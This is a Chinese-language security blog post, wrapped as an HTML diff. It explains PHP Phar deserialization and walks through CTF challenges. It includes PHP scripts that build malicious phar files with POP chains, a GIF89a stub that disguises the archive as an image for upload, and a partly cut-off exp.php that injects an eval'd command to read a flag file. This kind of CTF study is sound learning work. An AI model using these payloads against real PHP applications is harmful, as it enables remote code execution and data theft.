@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Phar反序列化漏洞是PHP中的一种安全漏洞，与PHP的Phar扩展和对象反序列化机制有关。Phar扩展允许将多个文件打包成一个单一的Phar归档文件，类似于ZIP或TAR。当Phar归档文件被加载时，PHP会自动反序列化其中的元数据。如果攻击者能够控制Phar归档文件的内容，他们可以构造恶意的元数据，使其在反序列化时触发任意代码执行。这种漏洞通常发生在应用程序对用户上传的文件处理不当，允许攻击者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phar反序列化学习总结">
+<meta property="og:url" content="http://example.com/2024/12/10/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="Phar反序列化漏洞是PHP中的一种安全漏洞，与PHP的Phar扩展和对象反序列化机制有关。Phar扩展允许将多个文件打包成一个单一的Phar归档文件，类似于ZIP或TAR。当Phar归档文件被加载时，PHP会自动反序列化其中的元数据。如果攻击者能够控制Phar归档文件的内容，他们可以构造恶意的元数据，使其在反序列化时触发任意代码执行。这种漏洞通常发生在应用程序对用户上传的文件处理不当，允许攻击者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102039889.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040034.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040050.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040120.png">
+<meta property="article:published_time" content="2024-12-10T15:14:02.000Z">
+<meta property="article:modified_time" content="2025-05-10T12:44:22.402Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202505102039889.png">
+
+<link rel="canonical" href="http://example.com/2024/12/10/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>phar反序列化学习总结 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/10/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          phar反序列化学习总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-12-10 23:14:02" itemprop="dateCreated datePublished" datetime="2024-12-10T23:14:02+08:00">2024-12-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-10 20:44:22" itemprop="dateModified" datetime="2025-05-10T20:44:22+08:00">2025-05-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Phar反序列化漏洞是PHP中的一种安全漏洞，与PHP的Phar扩展和对象反序列化机制有关。Phar扩展允许将多个文件打包成一个单一的Phar归档文件，类似于ZIP或TAR。当Phar归档文件被加载时，PHP会自动反序列化其中的元数据。如果攻击者能够控制Phar归档文件的内容，他们可以构造恶意的元数据，使其在反序列化时触发任意代码执行。这种漏洞通常发生在应用程序对用户上传的文件处理不当，允许攻击者上传并加载恶意的Phar文件时。</p>
+<span id="more"></span>
+
+<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>怎么构造<code>pop</code>链：</p>
+<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
+<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a><code>phar</code>文件结构</h3><p><code>phar</code>文件主要由四部分组成</p>
+<ul>
+<li><strong>a stub</strong></li>
+</ul>
+<p>格式为：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。要求是必须以**<code>__HALT_COMPILER();?&gt;</code>**结尾，否则<code>phar</code>拓展将无法识别这个文件为<code>phar</code>文件。</p>
+<ul>
+<li><strong>a manifest describing the contents</strong></li>
+</ul>
+<p><code>phar</code>文件中被压缩的文件的一些信息，其中<code>Meta-data</code>部分的信息会以序列化的形式储存，这里是漏洞利用的关键点。</p>
+<ul>
+<li><strong>the file contents</strong></li>
+</ul>
+<p>被压缩的文件的内容。</p>
+<ul>
+<li><strong>a signature for verifying Phar integrity</strong></li>
+</ul>
+<p>签名，放在文件末尾，格式如下：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102039889.png" alt="image-20250112164001940" style="zoom: 50%;" />
+
+<p>​	<strong>注意：需要修改<code>php.ini</code>文件中的<code>phar.readonly = On</code>为<code>phar.readonly = Off</code>，才能成功生成<code>.phar</code>文件。</strong></p>
+<p>一个简单的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);   <span class="comment">//后缀名必须是phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;data = <span class="string">&quot;meta_data&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);   <span class="comment">//将自定义的meta-data($t) 存入manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;xxx&quot;</span>);   <span class="comment">//添加要压缩的文件，随便写</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();   <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​	运行代码，会在同目录下生成一个<code>phar.phar</code>文件，其内容如下，可以看到<code>meta-data</code>是以序列化的形式存储的。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040034.png" alt="image-20250112180250240" style="zoom:67%;" />
+
+<p>​	<code>php</code>大部分的文件系统函数，在参数可控的情况下，通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化。如下：</p>
+<p>进行反序列化操作</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// echo file_get_contents(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用前提条件"><a href="#利用前提条件" class="headerlink" title="利用前提条件"></a>利用前提条件</h3><p>先简单说一下<code>phar</code>反序列化漏洞能够利用的基本前提：</p>
+<ul>
+<li><code>phar</code>文件能够上传到服务器</li>
+<li>要有可利用的魔术方法，来触发反序列化</li>
+<li>文件操作函数的参数可控，且：<code>/</code>、<code>phar</code>字符没有被过滤</li>
+</ul>
+<h2 id="ctf实战练习"><a href="#ctf实战练习" class="headerlink" title="ctf实战练习"></a><code>ctf</code>实战练习</h2><h3 id="1-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#1-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="1.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a><code>1.[CISCN2019 华北赛区 Day1 Web1]Dropbox</code></h3><h3 id="2-SWPUCTF-2018-SimplePHP"><a href="#2-SWPUCTF-2018-SimplePHP" class="headerlink" title="2.[SWPUCTF 2018]SimplePHP"></a><code>2.[SWPUCTF 2018]SimplePHP</code></h3><p>怎么构造<code>pop</code>链：</p>
+<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;str = <span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;s.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-GXYCTF2019-BabysqliV3-0"><a href="#3-GXYCTF2019-BabysqliV3-0" class="headerlink" title="3.[GXYCTF2019]BabysqliV3.0"></a><code>3.[GXYCTF2019]BabysqliV3.0</code></h3><h4 id="分析upload-php源码"><a href="#分析upload-php源码" class="headerlink" title="分析upload.php源码"></a>分析<code>upload.php</code>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># function __construct();</span></span><br><span class="line"><span class="comment"># function __toString();</span></span><br><span class="line"><span class="comment"># function __destruct();</span></span><br><span class="line"><span class="comment"># function upload($file);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();   <span class="comment">#接着调用__construct函数</span></span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);   <span class="comment">#会调用upload方法,$file=$_FILES[&quot;file&quot;]</span></span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))   <span class="comment">#执行这一步前，会自行调用__destruct函数</span></span><br><span class="line">	&#123;   <span class="comment">#接着这里会触发__toString()函数</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实例化一个类的对象后，会自发调用<code>__construct()</code>构造函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)   #构造函数。它在创建类的新对象时自动调用</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">	<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];   <span class="comment">#需要执行这一步</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后会调用<code>upload($file)</code>方法，下面的<code>[^a-z0-9]</code>表示，匹配任何非小写字母或非数字的符号。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)   #<span class="title">file</span> = $<span class="title">_FILES</span>[&quot;<span class="title">file</span>&quot;]</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   <span class="comment">#当前目录/uploads/md5($_SESSION[&#x27;user&#x27;])/</span></span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;   <span class="comment">#.txt</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>   <span class="comment">#需要进入else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)</span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;   <span class="comment">#设置了this-&gt;cmd = move_uploaded_file(&#x27;xx&#x27;, &#x27;xxx&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>上面最后一行代码看起来比较乱，其实就是利用<code>.</code>连接了五个部分，下面我框出了要连接的内容。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040050.png" alt="QQ_1727423925626"></p>
+<p>如果其中，<code>$file[&#39;tmp_name&#39;]=tmp_name</code>、<code>$this-&gt;Filename=filename</code>，那么连接起来就是这样的：<code>move_uploaded_file(&#39;tmp_name&#39;, &#39;filename&#39;);</code>。</p>
+<p>而<code>move_uploaded_file()</code>是一个用于将上传的文件，<strong>从临时目录移动到新的路径下</strong>的函数，如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="string">&#x27;临时文件路径&#x27;</span>, <span class="string">&#x27;目标文件路径&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接下来将随着类的销毁，会自发调用<code>__destruct</code>析构函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   <span class="comment">#要绕过if，执行eval()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功绕过<code>if</code>后，便能执行<code>move_uploaded_file($file[&#39;tmp_name&#39;], $this-&gt;Filename);</code>。然后回到主程序流中，即将进行<code>if</code>语句的判断，但此时也触发了<code>__toString()</code>函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   </span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;  </span><br><span class="line">	<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>__toString()</code>执行完后，程序会接着执行<code>echo file_get_contents($this-&gt;Filename);</code>。</p>
+<h4 id="phar反序列化利用思路"><a href="#phar反序列化利用思路" class="headerlink" title="phar反序列化利用思路"></a><code>phar</code>反序列化利用思路</h4><p>​	<code>Uploader</code>类中有一个魔术方法<code>__destruct()</code>，其中我们可以利用<code>eval($this-&gt;cmd)</code>，但是要绕过<code>if</code>语句，否则，<code>$this-&gt;cmd</code>会被重新赋值，那么<code>exp.phar</code>中的对<code>$this-&gt;cmd</code>值便无效了。</p>
+<p>​	而绕过<code>if</code>需要使<code>token</code>等于<code>$_SESSION[&#39;user&#39;]</code>，通过前面对源码的分析及上传文件后的回显可知，<code>$_SESSION[&#39;user&#39;]</code>其实就是回显里的<code>.txt</code>前面的一串字符。</p>
+<p><code>exp.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;GXY897d924ee25aa61d0373a64ee3e56354&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">HaHa</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);   <span class="comment">#生成的.phar文件名称</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">#固定格式</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ 